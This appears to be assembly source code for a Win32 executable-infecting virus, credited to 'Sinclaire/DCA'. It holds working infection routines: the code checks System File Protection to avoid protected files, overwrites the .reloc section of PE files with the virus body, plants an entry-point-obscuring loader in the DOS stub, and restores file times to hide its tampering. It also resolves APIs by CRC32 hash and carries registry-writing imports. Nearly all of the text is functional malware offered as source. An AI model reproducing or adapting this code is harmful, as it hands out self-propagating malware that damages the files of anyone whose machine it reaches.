;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; GetCRC32																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Computes CRC32 checksum of the given data								;
;																			;
; Input:																	;
;   ESI : pointer to data													;
;   ECX : size of data in bytes												;
;																			;
; Output:																	;
;   EAX : CRC32 checksum													;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
GetCRC32:
    	pushad

		mov  	edi, ecx
    	xor  	ecx, ecx
    	dec  	ecx
    	mov  	edx, ecx

	CRC32_NextByte:
    	xor  	eax, eax
    	xor  	ebx, ebx
    	lodsb
    	xor  	al, cl
    	mov  	cl, ch
    	mov  	ch, dl
    	mov  	dl, dh
    	mov  	dh, 8

	CRC32_NextBit:
		shr		bx, 1
    	rcr  	ax, 1
    	jnc  	CRC32_NoCRC
    	xor  	ax, 08320h
    	xor  	bx, 0EDB8h

	CRC32_NoCRC:
    	dec  	dh
    	jnz  	CRC32_NextBit
    	xor  	ecx, eax
    	xor  	edx, ebx
    	dec  	edi
    	jnz  	CRC32_NextByte
    	not  	edx
    	not  	ecx
    	mov  	eax, edx
    	rol  	eax,16
    	mov  	ax, cx

    	mov  	[ebp + CRC32], eax
    	popad
    	mov  	eax, [ebp + CRC32]

    	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; GetNextParam 																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Moves esi pointer to next parameter in a commandline-type string		;
; 	Uses SEH to avoid possible protection faults							;
;																			;
; Input:																	;
;   ESI : pointer to a commandline-type string								;
;																			;
; Output:																	;
;   ESI : points to next parameter											;
;   CF (Carry Flag) : set if string terminated, clear on success			;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
GetNextParam:
		push 	eax
		push  	ecx

		SETUP_SEH_HANDLER	GNP_Fail

		mov		cl, 20h                      			; Character to match (space)
	GNP_SkipSpaces:
		lodsb                              				;
		test  	al, al                       			;
		jz    	GNP_Fail                     			; If al is zero, string was terminated
		cmp   	al, cl                       			;
		je    	GNP_SkipSpaces               			; There are remaining spaces, loop on

		cmp   	al, 22h                      			; First char is a quote?
		jne   	GNP_Find                     			; No: we must find a space
		mov   	cl, 22h                      			; Yes: we must find the closing quote

	GNP_Find:
		lodsb
		test  	al, al
		jz    	GNP_Fail
		cmp   	al, cl
		jne   	GNP_Find

		RESTORE_SEH_HANDLER

		pop   	ecx
		pop   	eax
    	clc
		ret

	GNP_Fail:
    	RESTORE_SEH_HANDLER
    	pop   	ecx
    	pop   	eax

    	stc

    	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; TryAddress																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Checks if esi points to a valid PE base address (useful to 				;
;	find Kernel32), uses SEH to avoid possible faults, so the 				;
;	address may be anything													;
;																			;
; Input:																	;
;   ESI : address to try													;
;																			;
; Output:																	;
;   CF (Carry Flag) : set on error, clear on success						;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
TryAddress:
		pushad

		SETUP_SEH_HANDLER 	TA_Fail

		cmp 	word ptr [esi], 'ZM'
		jne 	TA_Fail
    	add 	esi, [esi.MZ_lfanew]
    	cmp 	word ptr [esi], 'EP'
    	je  	TA_Success

	TA_Success:
    	RESTORE_SEH_HANDLER

    	popad

    	clc

    	ret

	TA_Fail:
    	RESTORE_SEH_HANDLER

    	popad

    	stc

    	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Randomizing functions
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; RNG_Init 																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Initialises the Random Number Generator									;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;	None																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
RNG_Init:
	pushad

    apicall	GetTickCount
    mov		[ebp + RndSeed_1], eax
    rol   	eax, 3
    mov   	[ebp + RndSeed_2], eax
    rol   	eax, 3
    mov   	[ebp + RndSeed_3], eax
    rol   	eax, 3
    mov   	[ebp + RndSeed_4], eax
    rol   	eax, 3
    mov   	[ebp + RndSeed_5], eax
    rol   	eax, 3
    mov   	[ebp + RndSeed_6], eax

    popad

    ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; RNG_GetRandom 															;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Returns a 32-bit random number											;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;   EAX : random number														;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
RNG_GetRandom:
	push	edx
    mov     eax, [ebp + RndSeed_1]
    mov     edx, [ebp + RndSeed_2]
    xor     eax, [ebp + RndSeed_3]
    xor     edx, [ebp + RndSeed_4]
    shrd    eax, edx, 11h
    push    eax
    mov     eax, [ebp + RndSeed_5]
    mov     edx, [ebp + RndSeed_6]
    and     eax, 0FFFFFFFEh
    add     [ebp + RndSeed_1], eax
    adc     [ebp + RndSeed_2], edx
    inc     dword ptr [ebp + RndSeed_3]
    inc     dword ptr [ebp + RndSeed_4]
    pop     eax
    pop     edx

    ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; RNG_GetRandomRange 														;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Returns a random number from 0 to [EAX - 1]								;
;																			;
; Input:																	;
;   EAX : maximum random number to get + 1									;
;																			;
; Output:																	;
;   EAX : random number														;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
RNG_GetRandomRange:
		push 	ebx
		mov  	ebx, eax
		call 	RNG_GetRandom

	RNG_R_Loop:
		cmp  	eax, ebx                      			; Now, keep result in the given range
		jl   	RNG_R_Ok                      			; It's in range, so we can return
		shr  	eax, 1                        			; It's not. We divide it by 2 and
		jmp  	RNG_R_Loop                    			; loop to compare again

	RNG_R_Ok:
    	pop  	ebx

    	ret                                				; Return!
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Infection Code
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; InfectFile 																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Infects a Portable Executable file by overwriting .reloc section		;
;																			;
; Input:																	;
;   ESI : points to filename to infect										;
;																			;
; Output:																	;
;	None																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
InfectFile:
		pushad

    	mov		[ebp + FileName], esi
    	mov   	[ebp + FileInfected], FALSE

    	mov   	edi, esi
    	mov   	ecx, MAX_PATH
    	xor   	eax, eax
    	cld
    	repnz scasb

    	mov   	eax, [edi-5]
    	or    	eax, 20202000h
    	cmp   	eax, 'exe.'
    	jne   	IF_Quit

	; Avoid System File Protection
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		lea  	edx, [ebp + szSfc]            			; We have to avoid Win2K/WinME SFP
    	push 	edx                           			; Push a pointer to library name
    	apicall	LoadLibrary                   			; Load it
    	test 	eax, eax                      			; If the library doesn't exist, we
    	jz   	IF_NotProtected               			; can safely ignore SFP

		lea  	edx, [ebp + szSfcProc]        			; Pointer to function name
    	push 	edx                           			; Push it
    	push 	eax                           			; Push module handle
    	apicall GetProcAddress                			; Call API
    	test 	eax, eax                      			; No function with that name, so we
    	jz   	IF_NotProtected               			; proceed to infection

    	push 	esi                           			; Pointer to victim's filename
    	push 	NULL                          			; This parameter must be NULL
    	call 	eax                           			; Call SfcIsFileProtected
    	test 	eax, eax                      			; Not protected? Go ahead, continue
    	jz   	IF_NotProtected               			; with infection
    	jmp  	IF_Quit                       			; File protected, we must quit

	; Save file attributes and remove them
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_NotProtected:
    	push 	esi                           			; Points to filename
    	apicall	GetFileAttributes             			; Call API
    	mov  	[ebp + FileAttribs], eax      			; Save attributes for later use

    	push 	FILE_ATTRIBUTE_NORMAL         			; Now we change the attributes of the
    	push 	esi                           			; file to FILE_ATTRIBUTE_NORMAL
    	apicall	SetFileAttributes             			; Call API


	; Open a handle to the file
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_OpenFile:
    	xor  	eax, eax
    	push 	eax
    	push 	eax
    	push 	OPEN_EXISTING
    	push 	eax
    	push 	FILE_SHARE_READ
    	push 	GENERIC_READ or GENERIC_WRITE
    	push 	esi
    	apicall	CreateFile
    	inc  	eax
    	jz   	IF_RestoreAttribs
    	dec  	eax
    	mov  	[ebp + FileHandle], eax

	; Save creation/access/modify times
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    	lea  	edx, [ebp + FileTime_Written]
    	push 	edx
    	lea  	edx, [ebp + FileTime_Accessed]
    	push 	edx
    	lea  	edx, [ebp + FileTime_Created]
    	push 	edx
    	push 	[ebp + FileHandle]
    	apicall	GetFileTime

	; Save file size
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    	push 	NULL
    	push 	[ebp + FileHandle]
    	apicall	GetFileSize
    	mov  	[ebp + FileSize], eax


	; Open a file mapping object
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_CreateMapping:
    	xor  	eax, eax
    	push 	eax
    	push 	[ebp + FileSize]
    	push 	eax
    	push 	PAGE_READWRITE
    	push 	eax
    	push 	[ebp + FileHandle]
    	apicall	CreateFileMapping
    	test 	eax, eax
    	jz   	IF_CloseFile
    	mov  	[ebp + FileMapping], eax


	; Map a view of the file
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_CreateView:
    	xor  	eax, eax
    	push 	dword ptr [ebp + offset FileSize]
    	push 	eax
    	push 	eax
    	push 	FILE_MAP_ALL_ACCESS
    	push 	[ebp + FileMapping]
    	apicall	MapViewOfFile

    	test 	eax, eax
    	jz   	IF_CloseMapping
    	mov  	[ebp + FileView], eax
    	mov  	esi, eax

	; Check for MZ/PE signatures
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		cmp  	word ptr [esi], 'ZM'
    	jne  	IF_CloseMapping
    	add  	esi, [esi.MZ_lfanew]
    	cmp  	word ptr [esi], 'EP'
    	jne  	IF_CloseMapping

	; Check for space for the EPO loader
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    	mov  	esi, [ebp + FileView]
    	mov  	edi, esi
    	add  	esi, [esi.MZ_lfanew]
    	sub  	esi, edi
    	sub  	esi, size IMAGE_DOS_HEADER
    	cmp  	esi, SIZE_EPO_LOADER
    	jl   	IF_CloseView


	; Find '.reloc' section
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    	mov  	esi, [ebp + FileView]
    	add  	esi, [esi.MZ_lfanew]

    	movzx 	eax, word ptr [esi.FH_NumberOfSections]
    	mov  	[ebp + File_Sections], eax

    	add  	esi, size IMAGE_FILE_HEADER

    	mov  	eax, [esi.OH_ImageBase]
    	mov  	[ebp + File_ImageBase], eax

    	mov  	eax, [esi.OH_AddressOfEntryPoint]
    	add  	eax, [ebp + File_ImageBase]
    	mov  	[ebp + File_EntryPoint], eax

    	mov  	eax, [esi.OH_NumberOfRvaAndSizes]
    	imul 	ecx, eax, size IMAGE_DATA_DIRECTORY
    	add  	esi, size IMAGE_OPTIONAL_HEADER
    	add  	esi, ecx

    	mov   	eax, [ebp + File_Sections]

	IF_TrySection:
    	cmp   	dword ptr [esi], 'ler.'
    	jne   	IF_NextSection
    	add   	esi, 2
    	cmp   	dword ptr [esi], 'cole'
    	jne   	IF_NextSection
    	sub   	esi, 2
    	jmp   	IF_FoundRelocs

	IF_NextSection:
    	dec   	eax
    	test  	eax, eax
    	jz    	IF_CloseView
    	add   	esi, size IMAGE_SECTION_HEADER
    	jmp   	IF_TrySection

	IF_FoundRelocs:
		cmp   	[esi.SH_SizeOfRawData], VIRUS_SIZE
    	jl    	IF_CloseView

    	cmp   	[esi.SH_Characteristics], IMAGE_SCN_CNT_CODE    or \
    									  IMAGE_SCN_MEM_EXECUTE or \
    									  IMAGE_SCN_MEM_WRITE
    	je    	IF_CloseView

    	mov   	[ebp + File_SectionHeader], esi
    	mov   	eax, [esi.SH_VirtualAddress]
    	mov   	[ebp + File_SectionRVA], eax
    	mov   	eax, [esi.SH_PointerToRawData]
    	mov   	[ebp + File_SectionRaw], eax
    	mov   	eax, [esi.SH_SizeOfRawData]
    	mov   	[ebp + File_SectionSize], eax


	; Copy virus body
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_CopyVirusBody:
    	mov  	edi, [ebp + File_SectionRaw]
    	add  	edi, [ebp + FileView]
    	lea  	esi, [ebp + VirusStart]

    	mov  	ecx, VIRUS_SIZE
    	cld
    	rep 	 movsb

    	mov  	ecx, [ebp + File_SectionSize]
    	sub  	ecx, VIRUS_SIZE
    	xor  	eax, eax
    	rep  	stosb

	; Insert EPO loader into DOS header/stub
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_InsertLoader:
		xor   	eax, eax
    	mov   	edi, [ebp + FileView]        			; Start of file
    	mov   	[edi.MZ_ip], ax              			; Clear DOS entry point
    	mov   	[edi.MZ_lfarlc], ax          			; Clear DOS relocations

    	add   	edi, 2                       			; Skip 'MZ' signature
    	mov   	al, OPCODE_JMP_SHORT         			; Setup a JMP SHORT <DISP>
    	stosb                              				; Insert JMP SHORT opcode
    	mov		eax, size IMAGE_DOS_HEADER   			; Calc destination: after MZ header
    	add   	eax, 2                       			; skipping first 2 bytes of code
    	sub   	al,  4                       			; but relative to next EIP!
    	stosb                              				; Insert displacement byte

    	mov   	eax, [ebp + File_ImageBase]  			; Calculate virus entry point:
    	add   	eax, [ebp + File_SectionRVA] 			; image base + virus section RVA

    	lea   	edx, [ebp + EntryPoint]      			; Save virus entry point into our
    	mov   	[edx], eax                   			; loader code

    	mov   	edi, [ebp + FileView]        			; Start of file
    	add   	edi, size IMAGE_DOS_HEADER   			; Go beyond MZ header
    	lea   	esi, [ebp + EPOLoader]       			; Address of our loader code
    	mov   	ecx, SIZE_EPO_LOADER         			; Size of code
    	rep   	movsb                        			; Store it!

	; Update headers
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_UpdateHeaders:
    	mov  	edi, [ebp + FileView]
    	add  	edi, [edi.MZ_lfanew]
    	add  	edi, size IMAGE_FILE_HEADER
    	xor  	eax, eax                      			; Clear entry point (reset to zero)
    	mov  	[edi.OH_AddressOfEntryPoint], eax

    	mov  	esi, [ebp + File_SectionHeader]
    	mov  	[esi.SH_Characteristics], IMAGE_SCN_CNT_CODE    or \
    									  IMAGE_SCN_MEM_EXECUTE or \
    									  IMAGE_SCN_MEM_WRITE

    	mov  	[ebp + FileInfected], TRUE    			; Infection complete

	; Unmap the view
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_CloseView:
    	push 	[ebp + FileView]
    	apicall	UnmapViewOfFile

	; Close the file mapping object
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_CloseMapping:
		push 	[ebp + FileMapping]
    	apicall	CloseHandle

  	; Close the file handle, restore times
  	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_CloseFile:
		IF DEBUG
    		push 	[ebp + FileHandle]
    		apicall	CloseHandle
		ELSE
    		lea  	edx, [ebp + FileTime_Written]
    		push 	edx
    		lea  	edx, [ebp + FileTime_Accessed]
    		push 	edx
    		lea  	edx, [ebp + FileTime_Created]
    		push 	edx
    		push 	[ebp + FileHandle]
    		apicall	SetFileTime

    		push 	[ebp + FileHandle]
    		apicall	CloseHandle
		ENDIF

	; Restore the file attributes
	;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	IF_RestoreAttribs:
    	push 	[ebp + FileAttribs]
    	push 	[ebp + FileName]
    	apicall	SetFileAttributes

	IF_Quit:
    	popad

    	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; EPO - stub program                                                    	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Code to replace victim's DOS stub by a crafted one ;)					;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;	None																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
EPOLoader:
           db 0EBh								; jmps ...
           db MSDOS_Code - WIN32_Code			; (relative displacement)

	WIN32_Code:
           db 052h                     			; push edx
           db 045h                     			; inc  ebp
           db 068h                     			; push ...

    EntryPoint:
           dd 000000000h               			;
           db 033h, 0C0h               			; xor  eax, eax
           db 064h, 0FFh, 030h         			; push fs:[eax]
           db 064h, 089h, 020h         			; mov  fs:[eax], esp
           db 0F7h, 0F0h               			; div  eax

    MSDOS_Code:
           db 0BAh                     			; mov  dx ...
           dw MSDOS_String - EPOLoader   		; (offset string)
           db 00Eh                     			; push cs
           db 01Fh                     			; pop  ds
           db 0B4h, 009h               			; mov  ah, 09
           db 0CDh, 021h               			; int  21
           db 0B8h, 001h, 04Ch         			; mov  ax, 04C01
           db 0CDh, 021h               			; int  21

    MSDOS_String:
         ; db 'This program requires Microsoft Windows.'
         ; db 'This program cannot be run in DOS mode.'
         ; db 'This program must be run under Win32.'
         ; Aargh! I need more space!
         ; db 'This program needs Win32'
           db 'DCA OWNS YOU'
           db  CRLF, '$', 0

    EPOLoader_End:

	SIZE_EPO_LOADER 	equ 	EPOLoader_End - EPOLoader
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Virus Data
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Kernel32           dd    00h
    HostEntry          dd    00h
    CRC32              dd    00h
    Key32              dd    00h
    Count              dd    00h
    StartupInfo        dd    00h
    ProcessInfo        dd    00h
    CmdLine            dd    00h
    CmdSpawn           dd    00h
    CmdExefile         dd    00h

    RndSeed_1          dd    00h
    RndSeed_2          dd    00h
    RndSeed_3          dd    00h
    RndSeed_4          dd    00h
    RndSeed_5          dd    00h
    RndSeed_6          dd    00h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Export table data
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ET_MaxNames        dd    00h
    ET_PtrNames        dd    00h
    ET_PtrAddresses    dd    00h
    ET_PtrOrdinals     dd    00h
    ET_TmpAddress      dd    00h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Infection data
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    FileName           	dd    00h
    FileAttribs        	dd    00h
    FileSize           	dd    00h
    FileHandle         	dd    00h
    FileMapping        	dd    00h
    FileView           	dd    00h
    FileTime_Created   	dd    00h, 00h
    FileTime_Accessed  	dd    00h, 00h
    FileTime_Written   	dd    00h, 00h
    File_ImageBase     	dd    00h
    File_EntryPoint    	dd    00h
    File_Sections      	dd    00h
    File_SectionHeader	dd    00h
    File_SectionSize	dd    00h
    File_SectionRaw		dd    00h
    File_SectionRVA 	dd    00h
    FileInfected      	dd    00h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Kernel32 API CRC32 Names
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Kernel_API_CRC32:
    	_ExitProcess          	dd        040F57181h
    	_CreateProcess         	dd        0267E0B05h
    	_LoadLibrary          	dd        04134D1ADh
    	_GetProcAddress         dd        0FFC97C1Fh
    	_GlobalAlloc           	dd        083A353C3h
    	_GetModuleFileName     	dd        004DCF392h
    	_GetStartupInfo       	dd        052CA6A8Dh
    	_GetCommandLine     	dd        03921BF03h
    	_GetWindowsDirectory	dd        0FE248274h
    	_CloseHandle            dd        068624A9Dh
    	_CreateFile             dd        08C892DDFh
    	_CreateFileMapping      dd        096B2D96Ch
    	_MapViewOfFile          dd        0797B49ECh
    	_UnmapViewOfFile        dd        094524B42h
    	_GetFileAttributes      dd        0C633D3DEh
    	_SetFileAttributes      dd        03C19E536h
    	_GetFileSize            dd        0EF7D811Bh
    	_GetFileTime            dd        04434E8FEh
    	_SetFileTime            dd        04B2A3E7Dh
    	_CopyFile               dd        05BD05DB1h
    	_GetTickCount           dd        0613FD7BAh
    	_GetSystemTime          dd        075B7EBE8h
    	_Sleep                  dd        00AC136BAh
    	_lstrcat            	dd        0C7DE8BACh
                  				dd         00000000h
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Kernel32 API Addresses
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Kernel_API_Addr:
    	ExitProcess_          	dd        0
    	CreateProcess         	dd        0
    	LoadLibrary            	dd        0
    	GetProcAddress         	dd        0
    	GlobalAlloc            	dd        0
    	GetModuleFileName      	dd        0
    	GetStartupInfo         	dd        0
    	GetCommandLine        	dd        0
    	GetWindowsDirectory 	dd        0
    	CloseHandle          	dd        0
    	CreateFile            	dd        0
    	CreateFileMapping     	dd        0
    	MapViewOfFile         	dd        0
    	UnmapViewOfFile       	dd        0
    	GetFileAttributes     	dd        0
    	SetFileAttributes    	dd        0
    	GetFileSize         	dd        0
    	GetFileTime       		dd        0
    	SetFileTime          	dd        0
    	CopyFile              	dd        0
    	GetTickCount          	dd        0
    	GetSystemTime         	dd        0
    	Sleep                	dd        0
    	lstrcat               	dd        0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; User32 API CRC32 Names
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	User_API_CRC32:
		_MessageBox		dd        0D8556CF7h
		_wsprintf   	dd        0A10A30B6h
                   		dd         00000000h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; User32 API Addresses
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	User_API_Addr:
		MessageBox    	dd        0
		wsprintf      	dd        0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Advapi32 API CRC32 Names
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Advapi_API_CRC32:
		_RegOpenKeyEx  	dd        0CD195699h
    	_RegCloseKey   	dd        0841802AFh
    	_RegSetValueEx 	dd        05B9EC9C6h
    	_RegSetValue   	dd        0E78187CEh
                      	dd         00000000h
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Advapi32 API Addresses
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Advapi_API_Addr:
    	RegOpenKeyEx   	dd        0
    	RegCloseKey     dd        0
    	RegSetValueEx	dd        0
    	RegSetValue 	dd        0

 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Misc Stuff/Strings
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	Strings:
    	szAuthour	   	db  'Sinclaire/DCA', 0
    	szVirusName    	db  VIRUS_NAME, 0
    	szVirusCredits 	db  '[',VIRUS_NAME, '] ', VIRUS_VERSION, CRLF
                   		db  '(C) 2004 by Sinclaire', CRLF, CRLF
                   		db  'As I walk, all my life drifts before me', CRLF
                   		db  'And though the end is near, Im not sorry', CRLF
                   		db  'Catch my soul, its willing to fly away', CRLF
                   		db  'Mark my words, believe my soul lives on', CRLF
                   		db  'Dont worry, now that I have gone', CRLF
                   		db  'Ive gone beyond to see the truth', CRLF
